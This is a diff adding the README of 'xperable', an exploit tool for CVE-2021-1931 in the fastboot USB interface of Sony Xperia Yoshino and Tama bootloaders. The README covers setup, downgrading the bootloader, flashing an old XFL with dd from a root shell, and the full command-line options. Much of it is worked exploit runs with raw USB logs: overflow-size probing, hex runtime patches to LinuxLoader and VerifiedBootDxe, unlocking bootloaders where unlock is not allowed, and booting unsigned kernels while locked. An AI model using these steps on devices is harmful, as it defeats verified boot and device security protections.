@@ -1,0 +1,496 @@
+xperable - Xperia ABL fastboot Exploit
+======================================
+
+The xperable tool is an exploit leveraging CVE-2021-1931 Android Boot Loader
+vulnerability of fastboot usb interface on Sony Yoshino and Tama platforms,
+based on Qualcomm Snapdragon 835 (MSM8998) and SDM845 chipsets.
+That includes Sony Xperia XZ Premium, Xperia XZ1 and Xperia XZ1 Compact mobile
+phones with many region specific models for Yoshino platform.
+And Sony Xperia XZ2 / XZ2 Compact / XZ2 Premium / XZ3 with region specific
+models for Tama platform.
+
+The exploit achieves arbitrary code execution in fastboot providing arbitrary
+memory access via fastboot usb interface to non-secure world RAM regions
+in Qualcomm Secondary Bootloader, i.e. XBL (eXtensible Boot Loader) with ABL
+(Android Boot Loader), including ability to write to read-only sections.
+
+
+Features
+--------
+
+Currently working features:
+
+- bootloader unlock without Sony unlock code even for devices with bootloader
+  *unlock not allowed*, like the Japanese models
+- re-lock bootloader to get back into original stock firmware state
+- unlock/re-lock this way does not erase Sony DRM device key
+- fastboot boot of not signed kernel in bootloader locked state (Tama is wip)
+- flexible command line options for experimenting with bootloader runtime
+  patching that can be scripted
+
+Android userdata erase is also skipped with unlock/re-lock, but that seems not
+to be that useful as the data is not accessible most likely because decryption
+fails due to flipped bootloader unlock status - android does not boot, needing
+the erase.
+
+Still it is possible for example to do an unlock, boot any android recovery
+kernel via ‘fastboot boot’ from usb and then re-lock BL back with following
+android boot working with the original userdata content.
+
+Possibility to boot not signed kernel in bootloader locked state from fastboot
+can allow for example to boot a rooted stock kernel or boot android recovery
+kernel with userdata access after authentication for decryption or even boot
+full custom ROM with locked BL.
+
+
+Limitations
+-----------
+
+Using the exploit to re-lock bootloader would not magically restore Sony
+DRM device key, i.e. DRM protected functionality would not work with stock
+firmware even after bootloader re-lock if the key had been already lost.
+
+Hardware based attestation will get working with stock firmware after re-lock
+only if ``persist`` partition is still intact, i.e. it did not get accidentaly
+flashed with it's "empty" content from Sony stock firmware, loosing the attest
+key this way.
+
+
+Compilation
+-----------
+
+The xperable tool is primarily designed for Linux but it can be compiled for
+Windows too. It depends on libusb-1.0 and uses `pe-parse`_ library which comes
+as a git submodule with this project.
+
+.. _pe-parse: https://github.com/trailofbits/pe-parse
+
+Clone this repository recursively
+
+::
+
+  $ git clone --recursive https://github.com/j4nn/xperable.git
+
+and use ``make`` to build the tool in Linux. You also need ``cmake`` which
+is called from this project's Makefile to build pe-parse library.
+
+The Makefile contains additional targets for cross compilation that can be
+selected via ``CROSS_BUILD`` variable setting on make command line, expecting
+a cross compilation toolchain as specified in the Makefile.
+
+The exploit needs yoshino LinuxLoader UEFI module as fastboot runtime patch
+base. It can be exctracted from ABL of Sony stock firmware bootloader -
+`uefi-firmware-parser`_ tool is needed for this. Exctraction is invoked
+from the Makefile if needed, reporting what stock firmware files to get
+and where to place them.
+
+.. _uefi-firmware-parser: https://github.com/theopolis/uefi-firmware-parser
+
+
+Yoshino Device Setup
+--------------------
+
+The exploit is targetting ``LA2_0_P_114`` bootloader, but it needs XFL
+from ``LA1_1_O_77`` version in order to work. While XFL is not directly
+used in fastboot mode, ABL customized by Sony verifies XFL integrity
+for some reason, influencing bootloader memory layout.
+XFL is a linux kernel that provides Sony flash mode (green LED light)
+functionality for flashing stock firmware files.
+
+With any newer XFL version the exploit is not able to overflow fastboot
+usb buffer into ABL code region, most likely because of bigger XFL size
+in all newer bootloader versions. Therefore you need to flash the old XFL
+manually from a root shell via dd command to ``xfl`` partition.
+
+In case bootloader is still locked, you can get a temporal root shell using
+`bindershell`_ exploit available for Sony stock Android Oreo firmware.
+If running a newer firmware, downgrade would be needed requiring userdata
+erase, so you may need to backup the phone first.
+Please check what firmware versions are supported by bindershell `here`_.
+
+.. _bindershell: https://github.com/j4nn/renoshell/tree/CVE-2019-2215
+.. _here: https://github.com/j4nn/renoshell/blob/CVE-2019-2215/jni/offsets.c#L36
+
+After making sure you can get a root shell, flash the ``LA2_0_P_114``
+bootloader version using only the ``boot`` subdirectory of the latest
+stock firmware available for your phone skipping flash of everything else.
+
+Prepare the old XFL image using ``make boot/xfl-o77.mbn`` command
+in this project's directory, following shown instructions to get
+required files if missing.
+
+Upload the ``boot/xfl-o77.mbn`` file to the phone using adb or sdcard
+and use following command in a root shell to flash it to xfl partition:
+
+::
+
+  # dd if=/sdcard/xfl-o77.mbn of=/dev/block/bootdevice/by-name/xfl
+
+You may need to adjust the location of xfl-o77.mbn in the ``if=`` option
+depending on where the file has been copied to. It may be also safer
+to use ``sync`` command in addition before rebooting the phone.
+
+
+Tama Device Setup
+-----------------
+
+The exploit is targetting ``LA2_0_P_118`` bootloader of XZ2 / XZ3 devices.
+This version of bootloader is present in the newest stock firmware versions
+of Japan specific models.
+
+International Tama devices have newer version of bootloader in the latest
+firmware versions, so you may need to downgrade in order to use the exploit.
+Flash only the ``boot`` subdirectory of 52.0.A.8.50 stock fw version skipping
+flash of everything else.
+
+
+Command Line Options
+--------------------
+
+The xperable tool interprets command line options shown bellow, immediately
+executing each of them as they appear, allowing to craft bootloader runtime
+patching scripts.
+
+::
+
+  $ ./xperable -h
+
+  xperable - Xperia ABL fastboot Exploit
+  (  https://github.com/j4nn/xperable  )
+
+  usage: ./xperable [-h] [-v] [-q] [-V] [-Q] [-A] [-B] [-U]
+                    [-b maxsize] [-t timeout] [-o offset] [-s size]
+                    [-c command] [-x] [-0] [-1] [-2] [-3] [-4]
+                    [-5] [-6] [-7] [-8] [-9] [-C cmdline]
+                    [-l] [-m] [-a addr] [-M module]
+                    [-r] [-O file] [-I file] [-w]
+                    [-P file] [-p patch]
+
+    -h            show this help and exit
+    -v            increase fastboot usb communication verbosity
+    -q            lower fastboot usb communication verbosity
+    -V            increase verbosity of the exploit itself
+    -Q            lower verbosity of the exploit
+    -A            do 'fastboot getvar all' with filtered output
+    -B            do 'fastboot getvar version-bootloader' command
+    -U            do 'fastboot getvar unknown' command
+    -b maxsize    set usb chunk max size to use with all transfers
+    -t timeout    set usb transfer timeout in ms, 5000 by default
+    -o offset     set offset parameter used in exploit test cases
+    -s size       set size parameter used with other options
+    -c command    set fastboot command string
+    -x            use extended version of abl patch
+    -0            basic test case to try to crash ABL LinuxLoader
+    -1            do previously set fastboot command
+    -2            try to return buffer offset distance to code hit
+    -3            similar as -2 option but using alternative method
+    -4            do full ABL LinuxLoader patching exploit
+    -5            similar as -4 option but using alternative method
+    -6            patch signature verification in VerifiedBootDxe
+    -7            fake unlock via 'green' -> 'orange' in kcmdline
+    -8            patch boot command to use two kernel images
+    -9            experimental stuff to test patch level override
+    -l            read out bootloader log from RAM, needs -4/-5 first
+    -m            list XBL UEFI modules with their base addresses
+    -a addr       set address used with BL RAM read and write options
+    -M module     set address for RAM r/w to base addr of UEFI module
+    -r            read 'size' block of bytes from 'addr' base in BL
+    -O file       write 'size' of bytes from tool's buffer to 'file'
+    -I file       read 'file' into tool's buffer setting 'size' too
+    -w            write 'size' block of bytes to 'addr' base in BL
+    -P file       load PE file to tool's buffer doing relocation
+                  to 'addr' base, setting 'size' to code boundary,
+                  applying -4/-5 patch in case of LinuxLoader fname
+    -p patch      apply specified 'patch' sequence to tool's buffer
+
+  'patch' is one or more 'subpatch' delimited by comma character
+  'subpatch' is 'hexoffs' 'patchseq' pair delimited by one of ':/%@'
+  characters specifying size or form of each element of 'patchseq'
+  'patchseq' is list of hex values delimited by comma character
+
+  There is following meaning of 'hexoffs' and 'patchseq' delimiter:
+    :             'patchseq' hex values are byte values
+    /             'patchseq' hex values are 32 bit values
+    %             'patchseq' hex values are 32 bit to be byte swapped
+    @             'patchseq' hex values are 64 bit values
+
+
+Usage Examples
+--------------
+
+It may be possible to use defaults preset in the exploit when testing
+with **Xperia XZ1 Compact (G8441)**, like this:
+
+::
+
+  $ ./xperable -B -U -4
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [+] Starting test4 size = 0xf3f880, offset = 0x30, payloadsize = 0xe7000
+  [+] Got LinuxLoader base addr 0x98dc0000 (0xa9ed1111)
+  [+] LinuxLoader @ 0x98dc0000 patched successfully (usb buff @ 0x97e85000, distance = 0x00f3b000)
+
+  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
+  [+] Print log buffer, logbuf_pos = 0x0000, length = 0x24ca:
+  UEFI Ver    : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
+  Build Info  : 64b Jul 23 2019 16:44:00
+  UEFI Ver   : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
+  Loader Build Info: Jul 23 2019 16:47:39
+  XBOOT (1306-5035_X_Boot_MSM8998_LA2.0_P_114)
+  Fastboot Build Info: Jul 23 2019 16:47:34
+
+With the above ``-4`` done succesfully bootloader can be unlocked (aka Y)
+or re-locked (aka X) in following way:
+
+::
+
+  $ ./xperable -c "oem unlock Y" -1 -c reboot -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock Y'
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'
+
+  $ ./xperable -c "oem unlock X" -1 -c reboot -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock X'
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'
+
+Following examples show testing with **Xperia XZ1 Dual SIM (G8342)**.
+Test if we can get fastboot code execution with usb buffer overflow
+into an infinite loop fully hanging fastboot.
+
+::
+
+  $ ./xperable -v -V -B -U -s 0xfff000 -0
+        {00000019->00000019:OK} "getvar:version-bootloader"
+        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
+        {0000000e->0000000e:OK} "getvar:unknown"
+        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
+  [+] Starting test0 size = 0x00fff000, offset = 0x00000030, cmd = 'download:00000010'
+    00000000-0000002c: [ 00 00 40 94 ]
+    00000030-00ffeffc: [ 00 00 00 14 ]
+        {00fff000->00fff000:OK} "download:00000010.@...@...@...@...@...@...@...@................."
+        {00000040<-00000000:TO} ""
+  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
+  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
+        {00000011->00000011:OK} "download:00000010"
+        {00000040<-00000000:TO} ""
+  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
+  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
+  [.] Finished test0: res = -1
+
+  $ ./xperable -c reboot-bootloader -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
+  [!] libusb_bulk_transfer failed: Operation timed out ep=0x01 len=0x0011 size=0x0011
+  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
+  [!] libusb_bulk_transfer failed: Operation timed out ep=0x01 len=0x0011 size=0x0011
+  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
+
+Not responding to ``reboot-bootloader`` fastboot command most likely confirms
+hanging code execution. Force reboot by holding power with Vol+ buttons together,
+then holding only Vol+ in order to boot back into fastboot.
+
+Now try to find a working buffer overflow size with test case ``-2``.
+Binary seach may be used in order to narrow down the range.
+
+::
+
+  $ ./xperable -v -V -B -U -s 0xf30080 -2
+        {00000019->00000019:OK} "getvar:version-bootloader"
+        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
+        {0000000e->0000000e:OK} "getvar:unknown"
+        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
+  [+] Starting test2 size = 0xf30080, offset = 0x30, cmd = 'download:00000010'
+        {00f30080->00f30080:OK} "download:00000010..............................................."
+        {00000040<-0000000d:OK} "DATA00000010."
+        {00000010->00000010:OK} "AAAAAAAAAAAAAAAA"
+        {00000040<-00000004:OK} "OKAY"
+  [+] test2 not hit: response = ''
+
+  $ ./xperable -c reboot-bootloader -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
+
+As it did not hit, try with bigger size:
+
+::
+
+  $ ./xperable -v -V -B -U -s 0xf60080 -2
+        {00000019->00000019:OK} "getvar:version-bootloader"
+        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
+        {0000000e->0000000e:OK} "getvar:unknown"
+        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
+  [+] Starting test2 size = 0xf60080, offset = 0x30, cmd = 'download:00000010'
+        {00f60080->00f60080:OK} "download:00000010..............................................."
+        {00000040<-00000000:IO} ""
+  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x81 len=0x0040 size=0x0040
+  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
+        {00000011->00000000:IO} ""
+  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x01 len=0x0011 size=0x0011
+  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
+  [!] test2 failed: response = ''
+
+It crashed and rebooted - be quick to hold Vol+ key to get back to fastboot
+mode. One more try with size in the middle:
+
+::
+
+  $ ./xperable -v -V -B -U -s 0xf48080 -2
+        {00000019->00000019:OK} "getvar:version-bootloader"
+        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
+        {0000000e->0000000e:OK} "getvar:unknown"
+        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
+  [+] Starting test2 size = 0xf48080, offset = 0x30, cmd = 'download:00000010'
+        {00f48080->00f48080:OK} "download:00000010..............................................."
+        {00000040<-00000012:OK} "f46eb0-vxyzf46eb0-"
+  [+] test2 succeeded: distance = 0xf46eb0 + 0x00 (offset was 0x30)
+
+  $ ./xperable -c reboot-bootloader -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
+
+Add 0x29d0 to the reported distance and use that size with ``-4`` test case:
+
+::
+
+  $ ./xperable -v -V -B -U -s 0xf49880 -4
+        {00000019->00000019:OK} "getvar:version-bootloader"
+        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
+        {0000000e->0000000e:OK} "getvar:unknown"
+        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
+  [.] Code boundary of LinuxLoader-p114.pe is 0x000e7000
+  [+] Starting test4 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
+        {00f49880->00f49880:OK} "download:000e7010...................................@u@.N5O)...."
+        {00000040<-0000000d:OK} "DATA........."
+  [+] Got LinuxLoader base addr 0x98dbe000 (0xa9ecf111)
+        {000e7000->000e7000:OK} "MZ..........................................................X..."
+        {00000040<-00000004:OK} "OKAY"
+        {00000008->00000008:OK} "flash:fb"
+        {00000040<-00000017:OK} "FAIL98DBE000/97E79000.."
+  [+] LinuxLoader @ 0x98dbe000 patched successfully (usb buff @ 0x97e79000, distance = 0x00f45000)
+
+With locked bootloader ``fastboot boot`` command is not allowed, test that:
+
+::
+
+  $ ./xperable -A
+  unlocked:no
+  version-baseband:1307-7471_47.2.A.11.228
+  version-bootloader:1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  secure:yes
+  product:G8342
+
+  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
+        {00000011->00000011:OK} "download:025f4000"
+        {00000040<-0000000d:OK} "DATA025f4000."
+        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
+        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
+        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
+        {00000040<-00000004:OK} "OKAY"
+  [.] Finished test1: res = 0
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
+        {00000004->00000004:OK} "boot"
+        {00000040<-00000017:OK} "FAILCommand not allowed"
+  Command not allowed
+  [.] Finished test1: res = 1
+
+Runtime patch it (being in successful ``-4`` state) and test ``fastboot boot`` again:
+
+::
+
+  $ ./xperable -M LinuxLoader -P LinuxLoader-p114.pe -p 286DC%1f2003d5 -w
+  [+] Loaded LinuxLoader-p114.pe (res=1052672, size=946176), applied LinuxLoader patch
+
+  $ ./xperable -M VerifiedBootDxe -s 0xc000 -r -p 25FC%3d000014 -w
+
+  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
+        {00000011->00000011:OK} "download:025f4000"
+        {00000040<-0000000d:OK} "DATA025f4000."
+        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
+        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
+        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
+        {00000040<-00000004:OK} "OKAY"
+  [.] Finished test1: res = 0
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
+        {00000004->00000004:OK} "boot"
+        {00000040<-00000004:OK} "OKAY"
+  [.] Finished test1: res = 0
+
+Not signed android kernel booted in bootloader locked state. The above patch
+to allow ``fastboot boot`` in bootloader locked state is already integrated
+in the exploit - it can be enabled by ``-x`` option used within the ``-4`` run.
+The patch of VerifiedBootDxe to skip image signature verification is implemented
+with ``-6`` test case. Not signed kernel can be booted from fastboot right after
+that:
+
+::
+
+  $ ./xperable -c reboot-bootloader -1
+  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
+
+  $ ./xperable -B -U -s 0xf49880 -x -4 -6
+  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
+  [+] Starting test4 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
+  [+] Got LinuxLoader base addr 0x98db9000 (0xa9eca111)
+  [+] LinuxLoader @ 0x98db9000 patched successfully (usb buff @ 0x97e74000, distance = 0x00f45000)
+  [+] Starting test6
+  [+] VerifiedBootDxe @ 0x9b2f0000 patched successfully
+
+  $ ./xperable -I twrp-poplar.img -1 -c boot -1
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
+  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
+
+
+
+Linux Host Setup
+----------------
+
+The exploit may need to use big usb transfers, like 16MB or more. This is most
+likely not supported by default, so kernel of your linux distro may need to be
+patched and recompiled in order to support allocation of big usb buffers.
+Without the kernel patch errors like
+
+::
+
+  [!] libusb_bulk_transfer failed: Insufficient memory ep=0x01 len=0xfff800 size=0xfff800
+  [!] fbusb_bufcmd send failed: reqsz=0xfff800 res=0xffffffff
+
+may be shown from running the exploit.
+
+There is ``misc/host-linux-kernel-x86-support-big-usb-transfers.patch``
+included with this project for reference how to patch the kernel.
+
+Following kernel command line option is needed in addition to enable
+big usb transfers:
+
+::
+
+  usbcore.usbfs_memory_mb=0
+
+Alternatively you may try ``-b maxsize`` command line option of the exploit
+to use smaller transfer chunks, but it may cause the exploit to fail entirely.
+
+
+Windows Host Setup
+------------------
+
+In order to use the exploit from Windows, you may need to install a fastboot
+driver for your phone in order to access it in fastboot mode.
+
+The usage is the same as with the examples from linux above, just make sure
+to use double quotes for commands containing a space, like ``"oem unlock"``.
+
+
+Usage from Another Phone
+------------------------
+
+It is possible to connect two android phones via USB-C adapter (and a powered
+USB HUB) and run the exploit from a root shell on one phone in order to exploit
+the other phone - just use the ``aarch64`` cross compiled build of the tool.
+The root shell of the "host" phone may come from full root or even a temp root.
